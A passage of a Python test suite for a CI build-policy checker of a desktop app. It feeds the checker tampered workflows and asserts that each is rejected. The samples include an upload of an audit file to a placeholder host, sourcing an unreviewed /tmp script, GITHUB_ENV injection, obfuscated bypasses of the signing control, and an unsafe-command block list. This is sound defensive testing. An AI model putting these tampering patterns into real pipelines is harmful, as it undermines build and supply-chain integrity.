                'runner_toolchain_residue=("${RUNNER_TEMP}"/python-sidecar-toolchain-*)\n'
                ':; test() { /usr/bin/true; }\n',
            ),
            (
                'runner_toolchain_residue=("${RUNNER_TEMP}"/python-sidecar-toolchain-*)\n',
                'runner_toolchain_residue=("${RUNNER_TEMP}"/python-sidecar-toolchain-*)\n'
                'eval \'test() { /usr/bin/true; }\'\n',
            ),
            (
                'runner_toolchain_residue=("${RUNNER_TEMP}"/python-sidecar-toolchain-*)\n',
                'runner_toolchain_residue=("${RUNNER_TEMP}"/python-sidecar-toolchain-*)\n'
                '! eval \'test() { /usr/bin/true; }\'\n',
            ),
            (
                'runner_toolchain_residue=("${RUNNER_TEMP}"/python-sidecar-toolchain-*)\n',
                'runner_toolchain_residue=("${RUNNER_TEMP}"/python-sidecar-toolchain-*)\n'
                'X=1 eval \'test() { /usr/bin/true; }\'\n',
            ),
            (
                'runner_toolchain_residue=("${RUNNER_TEMP}"/python-sidecar-toolchain-*)\n',
                'runner_toolchain_residue=("${RUNNER_TEMP}"/python-sidecar-toolchain-*)\n'
                'time eval \'test() { /usr/bin/true; }\'\n',
            ),
            (
                'runner_toolchain_residue=("${RUNNER_TEMP}"/python-sidecar-toolchain-*)\n',
                'runner_toolchain_residue=("${RUNNER_TEMP}"/python-sidecar-toolchain-*)\n'
                '! /bin/bash -c \'rm -f -- "$1"\' _ "${RUNNER_TEMP}/residue"\n',
            ),
            (
                'runner_toolchain_residue=("${RUNNER_TEMP}"/python-sidecar-toolchain-*)\n',
                'runner_toolchain_residue=("${RUNNER_TEMP}"/python-sidecar-toolchain-*)\n'
                '! source /tmp/unreviewed-cleanup.sh\n',
            ),
        )
        for old, new in semantic_mutations:
            with self.subTest(semantic_mutation=old):
                self.assertIn(old, cleanup)
                self.assertFalse(
                    CHECKER._post_build_cleanup_is_semantic(
                        cleanup.replace(old, new, 1)
                    )
                )

        current = inputs()
        changed(
            current,
            "workflow",
            "      - name: Validate Python scratch cleanup\n"
            "        if: ${{ always() }}",
            "      - name: Validate Python scratch cleanup",
        )
        with synchronized_workflow_summary(current):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(any("always gate" in error for error in errors), errors)

        current = inputs()
        changed(
            current,
            "formal_workflow",
            "      - name: Validate Python scratch cleanup\n"
            "        if: ${{ always() }}",
            "      - name: Validate Python scratch cleanup",
        )
        with synchronized_formal_workflow_summary(current):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(any("always gate" in error for error in errors), errors)

        for key, summary in (
            ("workflow", synchronized_workflow_summary),
            ("formal_workflow", synchronized_formal_workflow_summary),
        ):
            for old, new in semantic_mutations:
                with self.subTest(key=key, cleanup_mutation=old):
                    current = inputs()
                    yaml_indent = "          "
                    yaml_old = textwrap.indent(old, yaml_indent)
                    if yaml_old not in str(current[key]):
                        yaml_indent = "            "
                        yaml_old = textwrap.indent(old, yaml_indent)
                    self.assertIn(yaml_old, str(current[key]))
                    changed(
                        current,
                        key,
                        yaml_old,
                        textwrap.indent(new, yaml_indent) if new else "",
                    )
                    with summary(current):
                        errors = CHECKER.validate_policy(current)
                    self.assertTrue(
                        any(
                            "cleanup" in error.lower()
                            or "critical step" in error.lower()
                            or "run-step contract" in error.lower()
                            for error in errors
                        ),
                        errors,
                    )

            with self.subTest(key=key, mutation="framework-before-cleanup"):
                current = inputs()
                changed(
                    current,
                    key,
                    '          test -n "${RUNNER_TEMP:-}"',
                    '          test -x "${LCF_REVIEWED_BUILD_PYTHON}"\n'
                    '          test -n "${RUNNER_TEMP:-}"',
                )
                with summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any("cleanup-only always gate" in error for error in errors),
                    errors,
                )

            with self.subTest(key=key, mutation="provenance-always"):
                current = inputs()
                changed(
                    current,
                    key,
                    "      - name: Validate Python sidecar provenance\n"
                    "        shell: bash",
                    "      - name: Validate Python sidecar provenance\n"
                    "        if: ${{ always() }}\n"
                    "        shell: bash",
                )
                with summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(any("always gate" in error for error in errors), errors)

            for old in (
                '          runner_temp_real="$(cd "${RUNNER_TEMP}" && /bin/pwd -P)"',
                '          test "$(/usr/bin/stat -f \'%u\' "${RUNNER_TEMP}")" = "$(/usr/bin/id -u)"',
                '          (( (8#${runner_temp_mode} & 0022) == 0 ))',
            ):
                with self.subTest(key=key, mutation=old):
                    current = inputs()
                    changed(current, key, old, "          true")
                    with summary(current):
                        errors = CHECKER.validate_policy(current)
                    self.assertTrue(
                        any(
                            "critical step" in error
                            or "cleanup-only always gate" in error
                            or "post-build cleanup" in error
                            for error in errors
                        ),
                        errors,
                    )

    def test_post_build_cleanup_fixed_sanitized_assertion_labels_are_locked(self) -> None:
        labels = (
            "runner-temp-present",
            "runner-temp-absolute",
            "runner-temp-directory",
            "runner-temp-not-symlink",
            "runner-temp-canonical",
            "runner-temp-owner",
            "runner-temp-mode",
            "runner-toolchain-residue",
            "runner-producer-residue",
            "runner-distribution-binding-residue",
            "runner-source-residue",
            "source-root-prefix",
            "source-root-directory",
            "source-root-not-symlink",
            "source-root-canonical",
            "source-root-owner",
            "source-root-mode",
            "source-provenance-file",
            "source-provenance-not-symlink",
            "source-provenance-owner",
            "runner-source-residue-closure",
            "source-root-enter",
            "repo-fixed-directory-residue",
            "repo-fixed-symlink-residue",
            "repo-random-directory-residue",
        )
        for key, summary in (
            ("workflow", synchronized_workflow_summary),
            ("formal_workflow", synchronized_formal_workflow_summary),
        ):
            for label in labels:
                with self.subTest(key=key, label=label):
                    current = inputs()
                    changed(
                        current,
                        key,
                        f'          cleanup_assertion="{label}"',
                        '          cleanup_assertion="unreviewed"',
                    )
                    with summary(current):
                        errors = CHECKER.validate_policy(current)
                    self.assertTrue(
                        any(
                            "cleanup" in error.lower()
                            or "critical step" in error.lower()
                            or "run-step contract" in error.lower()
                            for error in errors
                        ),
                        errors,
                    )

        cleanup = CHECKER.EXPECTED_POST_BUILD_CLEANUP_RUN
        self.assertIn("lcf-scratch-cleanup: assertion=%s", cleanup)
        for unsafe in ("find ", "ls ", "rm -rf", "chmod 777", "compgen"):
            self.assertNotIn(unsafe, cleanup)

    def test_post_build_revalidates_all_five_fixed_provenance_keys(self) -> None:

        shape_lines = (
            '[[ "${LCF_SOURCE_SHA}" =~ ^[0-9a-f]{40}$ ]]',
            '[[ "${LCF_SOURCE_TREE}" =~ ^[0-9a-f]{40}$ ]]',
            '[[ "${LCF_SOURCE_SNAPSHOT_SHA256}" =~ ^[0-9a-f]{64}$ ]]',
            '[[ "${LCF_SOURCE_DATE_EPOCH}" =~ ^[0-9]+$ ]]',
            '[[ "${LCF_RENDERER_PACKAGE_LOCK_SHA256}" =~ ^[0-9a-f]{64}$ ]]',
        )
        for line in shape_lines:
            with self.subTest(line=line):
                current = inputs()
                changed(current, "workflow", line, "true")
                with synchronized_workflow_summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "critical step" in error
                        or "bootstrap" in error
                        for error in errors
                    ),
                    errors,
                )

        for residue_assertion in (
            '          test "${#runner_toolchain_residue[@]}" -eq 0',
            '          test "${#runner_producer_residue[@]}" -eq 0',
            '          test "${#runner_distribution_binding_residue[@]}" -eq 0',
        ):
            with self.subTest(residue_assertion=residue_assertion):
                current = inputs()
                changed(
                    current,
                    "workflow",
                    residue_assertion,
                    "          true",
                )
                with synchronized_workflow_summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "critical step" in error
                        or "cleanup" in error
                        or "run-step contract" in error
                        for error in errors
                    ),
                    errors,
                )

    def test_github_env_exports_are_exact_and_cannot_be_constructed_dynamically(self) -> None:
        mutations = (
            (
                '} >> "${GITHUB_ENV}"',
                '} >> "${GITHUB_ENV}"\n'
                "          printf 'UNREVIEWED=1\\n' >> \"${GITHUB_ENV}\"",
            ),
            (
                '} >> "${GITHUB_ENV}"',
                '} >> "${GITHUB_ENV}"\n'
                "          env_file=GITHUB_\"ENV\"\n"
                "          printf 'UNREVIEWED=1\\n' >> \"${!env_file}\"",
            ),
        )
        for old, new in mutations:
            with self.subTest(new=new):
                current = inputs()
                changed(current, "workflow", old, new)
                with synchronized_workflow_summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "GITHUB_ENV" in error or "critical step" in error
                        for error in errors
                    ),
                    errors,
                )

    def test_dynamic_and_ansi_c_octal_signing_controls_fail_with_fresh_hashes(self) -> None:
        additions = (
            "          export CSC_FOR_PU${LETTER}LL_REQUEST=true\n",
            "          export CSC_FOR_PU$'\\114'L_REQUEST=true\n",
            "          export CSC_FOR_PULL$'\\137'REQUEST=true\n",
        )
        for addition in additions:
            with self.subTest(addition=addition):
                current = inputs()
                changed(
                    current,
                    "workflow",
                    "            CSC_FOR_PULL_REQUEST=true \\\n"
                    "              ./node_modules/.bin/electron-builder \\\n",
                    "            CSC_FOR_PULL_REQUEST=true \\\n"
                    "              ./node_modules/.bin/electron-builder \\\n"
                    + addition,
                )
                with synchronized_workflow_summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "workflow PR ad-hoc signing control drifted",
                    errors,
                )

    def test_unreviewed_outbound_upload_command_fails(self) -> None:
        current = inputs()
        changed(
            current,
            "workflow",
            '          cat "${audit_json}"',
            '          cat "${audit_json}"\n          curl --upload-file "${audit_json}" https://example.invalid/evidence',
        )
        self.assertTrue(
            any("run-step contract" in error for error in CHECKER.validate_policy(current))
        )

    def test_pr_ad_hoc_signing_control_is_pack_command_local(self) -> None:
        raw_pack_command = (
            "            CSC_FOR_PULL_REQUEST=true \\\n"
            "              ./node_modules/.bin/electron-builder"
        )
        for replacement in (
            "npm --prefix desktop run pack:engineering-smoke",
            "CSC_FOR_PULL_REQUEST=1 npm --prefix desktop run pack:engineering-smoke",
            (
                "CSC_FOR_PULL_REQUEST=true "
                "npm --prefix desktop run prepare:engineering-smoke"
            ),
        ):
            with self.subTest(replacement=replacement):
                current = inputs()
                changed(
                    current,
                    "workflow",
                    raw_pack_command,
                    replacement,
                )
                self.assertIn(
                    "workflow PR ad-hoc signing control drifted",
                    CHECKER.validate_policy(current),
                )

        current = inputs()
        changed(
            current,
            "workflow",
            raw_pack_command,
            f"{raw_pack_command}\n"
            "          export CSC_FOR_PULL_REQUEST=true",
        )
        self.assertIn(
            "workflow PR ad-hoc signing control drifted",
            CHECKER.validate_policy(current),
        )

    def test_only_locked_python_installer_spctl_is_allowed(self) -> None:
        current = inputs()
        current["makefile"] = str(current["makefile"]) + "\n\t/usr/sbin/spctl --assess Bad.app\n"
        self.assertTrue(any("spctl" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        changed(
            current,
            "python_bootstrap",
            '"/usr/sbin/spctl"',
            '"/usr/bin/true"',
        )
        with synchronized_input_document_summaries(current, "python_bootstrap"):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any("exact Python toolchain bootstrap" in error for error in errors),
            errors,
        )

    def test_make_targets_are_exact_noncomment_command_contracts(self) -> None:
        current = inputs()
        replace_make_target(
            current,
            "packaged-smoke-policy-check",
            "packaged-smoke-policy-check:\n"
            "\t# $(PYTHON) -B tools/check_packaged_smoke_policy.py\n"
            "\ttrue\n"
            "\t$(PYTHON) -B -m unittest tools.tests.test_check_packaged_smoke_policy",
        )
        self.assertTrue(
            any(
                "policy Make target" in error
                for error in CHECKER.validate_policy(current)
            )
        )

        current = inputs()
        replace_make_target(
            current,
            "python-sidecar-source-verify",
            "python-sidecar-source-verify:\n"
            "\t# $(PYTHON) -I tools/build_python_sidecar.py --verify-source-only\n"
            "\ttrue",
        )
        self.assertTrue(
            any(
                "source-verify Make target" in error
                for error in CHECKER.validate_policy(current)
            )
        )

    def test_packaging_python_entrypoints_cannot_drop_no_site_isolation(
        self,
    ) -> None:
        make_mutations = (
            (
                "$(PYTHON) -S -B tools/check_packaged_smoke_policy.py",
                "$(PYTHON) -B tools/check_packaged_smoke_policy.py",
                "policy Make target",
            ),
            (
                '"$(LCF_REVIEWED_BUILD_PYTHON)" -I -S "$(LCF_REVIEWED_SOURCE_ROOT)/tools/build_python_sidecar.py" --verify-source-only',
                '"$(LCF_REVIEWED_BUILD_PYTHON)" -I "$(LCF_REVIEWED_SOURCE_ROOT)/tools/build_python_sidecar.py" --verify-source-only',
                "source-verify Make target",
            ),
            (
                '"$(LCF_REVIEWED_BUILD_PYTHON)" -I -S "$(LCF_REVIEWED_SOURCE_ROOT)/tools/bootstrap_python_sidecar.py" \\\n\t\t--install-reviewed-python',
                '"$(LCF_REVIEWED_BUILD_PYTHON)" -I "$(LCF_REVIEWED_SOURCE_ROOT)/tools/bootstrap_python_sidecar.py" \\\n\t\t--install-reviewed-python',
                "installer Make target",
            ),
            (
                '\tLCF_SOURCE_TREE="$(LCF_SOURCE_TREE)" \\\n\t"$(LCF_REVIEWED_BUILD_PYTHON)" -I -S "$(LCF_REVIEWED_SOURCE_ROOT)/tools/bootstrap_python_sidecar.py"',
                '\tLCF_SOURCE_TREE="$(LCF_SOURCE_TREE)" \\\n\t"$(LCF_REVIEWED_BUILD_PYTHON)" -I "$(LCF_REVIEWED_SOURCE_ROOT)/tools/bootstrap_python_sidecar.py"',
                "Python sidecar build Make target",
            ),
            (
                '"$(LCF_REVIEWED_BUILD_PYTHON)" -I -S "$(LCF_REVIEWED_SOURCE_ROOT)/tools/audit_python_sidecar.py"',
                '"$(LCF_REVIEWED_BUILD_PYTHON)" -I "$(LCF_REVIEWED_SOURCE_ROOT)/tools/audit_python_sidecar.py"',
                "Python sidecar audit Make target",
            ),
        )
        for old, new, expected in make_mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "makefile", old, new)
                with synchronized_input_document_summaries(current, "makefile"):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(any(expected in error for error in errors), errors)

        current = inputs()
        package = copy.deepcopy(current["package"])
        package["scripts"]["audit:python-sidecar"] = package["scripts"][
            "audit:python-sidecar"
        ].replace(" -I -S ", " -I ", 1)
        current["package"] = package
        with synchronized_input_document_summaries(current, "package"):
            errors = CHECKER.validate_policy(current)
        self.assertIn("Desktop standalone Python auditor script drifted", errors)

        current = inputs()
        replace_make_target(
            current,
            "python-sidecar-install-python",
            "python-sidecar-install-python: python-sidecar-source-verify\n"
            "\t# $(PYTHON) -I tools/bootstrap_python_sidecar.py --install-reviewed-python\n"
            "\ttrue",
        )
        self.assertTrue(
            any(
                "installer Make target" in error
                for error in CHECKER.validate_policy(current)
            )
        )

        current = inputs()
        replace_make_target(
            current,
            "python-sidecar-build",
            "python-sidecar-build: python-sidecar-toolchain\n\ttrue",
        )
        self.assertTrue(
            any(
                "Python sidecar build Make target" in error
                for error in CHECKER.validate_policy(current)
            )
        )

        mutations = (
            (
                "python-sidecar-build: python-sidecar-install-python",
                "python-sidecar-build:",
            ),
            (
                '\tLCF_SOURCE_SHA="$(LCF_SOURCE_SHA)" \\\n'
                '\tLCF_SOURCE_TREE="$(LCF_SOURCE_TREE)" \\\n',
                '\tLCF_SOURCE_TREE="$(LCF_SOURCE_TREE)" \\\n'
                '\tLCF_SOURCE_SHA="$(LCF_SOURCE_SHA)" \\\n',
            ),
            (
                '\tLCF_SOURCE_TREE="$(LCF_SOURCE_TREE)" \\\n'
                '\t"$(LCF_REVIEWED_BUILD_PYTHON)" -I -S "$(LCF_REVIEWED_SOURCE_ROOT)/tools/bootstrap_python_sidecar.py"',
                '\tLCF_SOURCE_TREE="$(LCF_SOURCE_TREE)" \\\n\ttrue',
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "makefile", old, new)
                self.assertTrue(
                    any(
                        "Python sidecar build Make target" in error
                        for error in CHECKER.validate_policy(current)
                    )
                )

        current = inputs()
        replace_make_target(
            current,
            "python-sidecar-packaging-test",
            "python-sidecar-packaging-test:\n"
            "\t# cd backend && .venv/bin/pytest ../tests/backend/test_python_sidecar_packaging.py\n"
            "\t:",
        )
        self.assertTrue(
            any(
                "focused-test Make target" in error
                for error in CHECKER.validate_policy(current)
            )
        )

    def test_generic_desktop_or_companion_build_fails(self) -> None:
        current = inputs()
        changed(
            current,
            "workflow",
            "run_exact_npm_script desktop build:engineering-smoke",
            "run_exact_npm_script desktop build",
        )
        errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any(
                "generic build" in error
                or "required command" in error
                or "exact Desktop" in error
                for error in errors
            )
        )

        current = inputs()
        package = copy.deepcopy(current["package"])
        package["scripts"]["build:engineering-smoke"] = "npm run build:companion"
        current["package"] = package
        with synchronized_input_document_summaries(current, "package"):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(any("engineering build" in error for error in errors))

        current = inputs()
        package = copy.deepcopy(current["package"])
        package["scripts"]["build:engineering-smoke"] = (
            "esbuild src/main/index.ts --bundle --outfile=dist/main/index.js"
        )
        current["package"] = package
        with synchronized_input_document_summaries(current, "package"):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any(
                "engineering build" in error or "package script" in error
                for error in errors
            )
        )

        current = inputs()
        package = copy.deepcopy(current["package"])
        package["scripts"]["test:engineering-smoke"] = (
            "vitest run tests/engineeringSmokePackaging.test.ts"
        )
        current["package"] = package
        with synchronized_input_document_summaries(current, "package"):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(any("package script" in error for error in errors))

        current = inputs()
        web_package = copy.deepcopy(current["web_package"])
        web_package["scripts"]["build:packaging"] = "vite build"
        current["web_package"] = web_package
        with synchronized_input_document_summaries(current, "web_package"):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any(
                "renderer packaging build" in error or "web package script" in error
                for error in errors
            )
        )

        current = inputs()
        changed(
            current,
            "workflow",
            "run_exact_npm_script web build:packaging",
            "run_exact_npm_script web build",
        )
        with synchronized_workflow_summary(current):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any(
                "renderer build" in error
                or "required command" in error
                or "renderer install/build/stage" in error
                for error in errors
            )
        )

        current = inputs()
        package = copy.deepcopy(current["package"])
        package["devDependencies"]["@electron/asar"] = "^3.4.1"
        current["package"] = package
        self.assertTrue(any("ASAR auditor dependency" in error for error in CHECKER.validate_policy(current)))

    def test_smoke_config_cannot_extend_formal_or_add_release_targets(self) -> None:
        additions = (
            "\nextends: electron-builder.yml\n",
            "\n  - target: dmg\n",
            "\npublish:\n  provider: github\n",
            "\n  - from: generated/qmd\n    to: qmd\n",
            "\n  - from: resources/update\n    to: update\n",
        )
        for addition in additions:
            with self.subTest(addition=addition.strip()):
                current = inputs()
                current["smoke_config"] = str(current["smoke_config"]) + addition
                self.assertTrue(CHECKER.validate_policy(current))

        current = inputs()
        changed(
            current,
            "smoke_config",
            "appId: dev.localcontextforge.engineering-smoke",
            "# appId: dev.localcontextforge.engineering-smoke\nappId: dev.example.evil",
        )
        self.assertTrue(any("allowlist" in error for error in CHECKER.validate_policy(current)))

    def test_formal_python_build_binds_commit_tree_and_cleanup(self) -> None:
        mutations = (
            (
                "      LCF_SOURCE_SHA: ${{ github.sha }}",
                "      LCF_SOURCE_SHA: deadbeef",
            ),
            (
                '          "${LCF_REVIEWED_BUILD_PYTHON}" -I -S \\\n'
                "            tools/check_exact_git_provenance.py \\\n",
                "          true # unified provenance checker removed \\\n",
            ),
            (
                "          git_safe fetch --no-tags --force --no-write-fetch-head \\\n",
                "          git status --porcelain=v1\n"
                "          git_safe fetch --no-tags --force --no-write-fetch-head \\\n",
            ),
            (
                "          test ! -L desktop/generated/python-sidecar-build\n",
                "          true\n",
            ),
            (
                '          [[ "${LCF_RENDERER_PACKAGE_LOCK_SHA256}" =~ '
                "^[0-9a-f]{64}$ ]]\n",
                "          true\n",
            ),
            (
                "          run_exact_npm_script web build:packaging\n",
                "          run_exact_npm_script web build\n",
            ),
            (
                '          readonly canonical_repository_url="https://github.com/fredgnr/local-context-forge.git"\n',
                "          exit 0\n"
                '          readonly canonical_repository_url="https://github.com/fredgnr/local-context-forge.git"\n',
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "formal_workflow", old, new)
                with synchronized_formal_workflow_summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "formal workflow" in error
                        or "formal exact renderer" in error
                        for error in errors
                    ),
                    errors,
                )

        current = inputs()
        workflow = str(current["formal_workflow"])
        workflow = workflow.replace(
            "          run_exact_npm_script web typecheck\n",
            "          __LCF_FORMAL_RENDERER_ORDER_SWAP__\n",
            1,
        ).replace(
            "          run_exact_npm_script web build:packaging\n",
            "          run_exact_npm_script web typecheck\n",
            1,
        ).replace(
            "          __LCF_FORMAL_RENDERER_ORDER_SWAP__\n",
            "          run_exact_npm_script web build:packaging\n",
            1,
        )
        current["formal_workflow"] = workflow
        with synchronized_formal_workflow_summary(current):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(any("renderer" in error for error in errors), errors)

    def test_formal_ancestry_fetch_is_canonical_and_env_replaced(self) -> None:
        mutations = (
            (
                "          git_safe() {\n"
                "            /usr/bin/env -i \\\n",
                "          git_safe() {\n"
                "            /usr/bin/env \\\n",
            ),
            (
                '            "${canonical_repository_url}" \\\n',
                "            origin \\\n",
            ),
            (
                "          git_safe merge-base --is-ancestor \\\n",
                "          /usr/bin/git merge-base --is-ancestor \\\n",
            ),
            (
                '            "+refs/heads/main:${reviewed_main_ref}"',
                '            "+refs/heads/main:refs/remotes/origin/main"',
            ),
            (
                "          trap cleanup_ancestry_repository EXIT\n",
                "          export GIT_CONFIG_COUNT=1\n"
                "          trap cleanup_ancestry_repository EXIT\n",
            ),
            (
                "              GIT_CONFIG_GLOBAL=/dev/null \\\n",
                '              GIT_CONFIG_GLOBAL="${HOME}/.gitconfig" \\\n',
            ),
            (
                'readonly canonical_repository_url="https://github.com/fredgnr/local-context-forge.git"',
                'readonly canonical_repository_url="https://example.invalid/unreviewed.git"',
            ),
            (
                "          trap cleanup_ancestry_repository EXIT\n",
                "          true # cleanup trap removed\n",
            ),
            (
                '            rm -rf -- "${ancestry_repository}"\n',
                '            rm -rf -- "${RUNNER_TEMP}"\n',
            ),
            (
                '              --git-dir="${ancestry_repository}" \\\n',
                '              --git-dir="${GITHUB_WORKSPACE}/.git" \\\n',
            ),
            (
                "          git_safe init --bare --quiet\n",
                "          true # bare repository initialization removed\n",
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed_last(current, "formal_workflow", old, new)
                with synchronized_formal_workflow_summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "formal workflow sanitized canonical Git ancestry gate drifted"
                        in error
                        or "formal private exact-source bootstrap" in error
                        for error in errors
                    ),
                    errors,
                )

        for addition in (
            "          printf 'LCF_SOURCE_TREE=%s\\n' \"${LCF_SOURCE_SHA}\" "
            '>> "${GITHUB_ENV}"\n',
            "          github_environment_name=GITHUB_ENV\n"
            "          printf 'LCF_SOURCE_TREE=%s\\n' \"${LCF_SOURCE_SHA}\" "
            '>> "${!github_environment_name}"\n',
        ):
            with self.subTest(addition=addition):
                current = inputs()
                changed(
                    current,
                    "formal_workflow",
                    '          readonly canonical_repository_url="https://github.com/fredgnr/local-context-forge.git"\n',
                    addition
                    + '          readonly canonical_repository_url="https://github.com/fredgnr/local-context-forge.git"\n',
                )
                with synchronized_formal_workflow_summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "formal workflow GITHUB_ENV provenance export surface drifted",
                    errors,
                )

    def test_formal_renderer_tree_and_snapshot_consumers_are_semantic(self) -> None:
        mutations = (
            (
                "formal_prepare_release",
                "expectedTree: tree",
                "expectedTree: release.commit",
                "formal renderer audit provenance options",
            ),
            (
                "formal_prepare_release",
                "expectedSourceSnapshotSha256: sourceSnapshotSha256",
                'expectedSourceSnapshotSha256: "0".repeat(64)',
                "formal renderer audit provenance options",
            ),
            (
                "formal_prepare_release",
                "expectedPackageLockSha256: rendererPackageLockSha256",
                'expectedPackageLockSha256: "0".repeat(64)',
                "formal renderer audit provenance options",
            ),
            (
                "formal_prepare_release",
                'const tree = (environment.LCF_SOURCE_TREE || "").toLowerCase();',
                'const tree = (environment.LCF_SOURCE_TREE || environment.GITHUB_SHA || "").toLowerCase();',
                "must not fall back to GITHUB_SHA",
            ),
            (
                "formal_reseal",
                "expectedTree: environment.LCF_SOURCE_TREE",
                "expectedTree: environment.LCF_SOURCE_SHA",
                "formal runtime renderer reseal contract",
            ),
            (
                "formal_reseal",
                "environment.LCF_RENDERER_PACKAGE_LOCK_SHA256",
                '"0".repeat(64)',
                "formal runtime renderer reseal contract",
            ),
            (
                "formal_release_policy_tests",
                '"tree:options.expectedTree,"',
                '"tree:undefined,"',
                "formal renderer provenance tests",
            ),
        )
        for key, old, new, expected in mutations:
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(any(expected in error for error in errors), errors)

    def test_formal_boundary_cannot_reference_smoke_config(self) -> None:
        current = inputs()
        current["formal_workflow"] = (
            str(current["formal_workflow"]) + "\n# electron-builder.smoke.yml\n"
        )
        self.assertTrue(any("formal workflow" in error for error in CHECKER.validate_policy(current)))

        for addition in (
            '\nenv:\n  "CSC_FOR_PULL\\u005fREQUEST": true\n',
            '\nenv:\n  "CSC_FOR_PULL\\x5fREQUEST": true\n',
            '\nenv:\n  "CSC_FOR_PU\\u004cL_REQUEST": true\n',
            '\nenv:\n  "CSC_FOR_PU\\x4cL_REQUEST": true\n',
            '\nenv:\n  "CSC_FOR_PU\\U0000004cL_REQUEST": true\n',
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            '    steps:\n      - run: export CSC_FOR_PULL"_"REQUEST=true\n',
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            '    steps:\n      - run: export CSC_FOR_PU${EMPTY}LL_REQUEST=true\n',
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            '    steps:\n      - run: |\n'
            '          export CSC_FOR_PU\\\n'
            '            LL_REQUEST=true\n',
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            '    steps:\n      - run: |\n'
            '          unset EMPTY\n'
            '          export CSC_FOR_PU"$EMPTY"LL_REQUEST=true\n',
            '\nenv:\n  "CSC_FOR_PU\\u{4c}L_REQUEST": true\n',
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            "    steps:\n      - run: export CSC_FOR_PU$'\\x4c'L_REQUEST=true\n",
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            "    steps:\n      - run: export CSC_FOR_PU$'\\114'L_REQUEST=true\n",
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            "    steps:\n      - run: export CSC_FOR_PULL$'\\137'REQUEST=true\n",
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            '    steps:\n      - run: export CSC_FOR_PU$(printf L)L_REQUEST=true\n',
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            '    steps:\n      - run: export CSC_FOR_PU"$@"LL_REQUEST=true\n',
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            '    steps:\n      - run: export CSC_FOR_PU"$(true)"LL_REQUEST=true\n',
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            '    steps:\n      - run: node -e \'process.env["CSC_FOR_PU" + "LL_REQUEST"]="true"\'\n',
        ):
            with self.subTest(addition=addition):
                current = inputs()
                current["formal_workflow"] = str(current["formal_workflow"]) + addition
                self.assertIn(
                    "formal workflow document contract drifted",
                    CHECKER.validate_policy(current),
                )
                expected_hashes = dict(CHECKER.EXPECTED_FORMAL_BOUNDARY_SHA256)
                expected_hashes["formal workflow"] = hashlib.sha256(
                    str(current["formal_workflow"]).encode("utf-8")
                ).hexdigest()
                with mock.patch.object(
                    CHECKER,
                    "EXPECTED_FORMAL_BOUNDARY_SHA256",
                    expected_hashes,
                ):
                    self.assertIn(
                        "formal workflow must not use the engineering PR signing control",
                        CHECKER.validate_policy(current),
                    )

        current = inputs()
        current["formal_workflow"] = (
            str(current["formal_workflow"])
            + "\n# CSC_FOR_PULLING_NOT_A_CONTROL\n"
        )
        expected_hashes = dict(CHECKER.EXPECTED_FORMAL_BOUNDARY_SHA256)
        expected_hashes["formal workflow"] = hashlib.sha256(
            str(current["formal_workflow"]).encode("utf-8")
        ).hexdigest()
        with mock.patch.object(
            CHECKER,
            "EXPECTED_FORMAL_BOUNDARY_SHA256",
            expected_hashes,
        ):
            self.assertNotIn(
                "formal workflow must not use the engineering PR signing control",
                CHECKER.validate_policy(current),
            )

        current = inputs()
        current["formal_workflow"] = (
            str(current["formal_workflow"]) + "\nCSC_FOR_PULL_REQUEST=true\n"
        )
        self.assertTrue(any("formal workflow" in error for error in CHECKER.validate_policy(current)))

    def test_engineering_hooks_cannot_import_formal_release_logic(self) -> None:
        current = inputs()
        current["before_pack"] = str(current["before_pack"]) + '\nrequire("./prepareRelease.cjs");\n'
        self.assertTrue(any("formal boundary" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        current["after_pack"] = str(current["after_pack"]) + '\nrequire("./resealPackagedRuntimes.cjs");\n'
        self.assertTrue(any("formal boundary" in error for error in CHECKER.validate_policy(current)))

    def test_bundle_auditor_cannot_launch_the_app(self) -> None:
        current = inputs()
        current["bundle_audit"] = (
            str(current["bundle_audit"])
            + '\nexecFileSync("release-smoke/App.app/Contents/MacOS/App");\n'
        )
        self.assertTrue(any("launch" in error for error in CHECKER.validate_policy(current)))

    def test_pyinstaller_archive_exception_cannot_expand(self) -> None:
        mutations = (
            (
                "Contents/Resources/sidecar/_internal/base_library.zip",
                "Contents/Resources/sidecar/evil.zip",
            ),
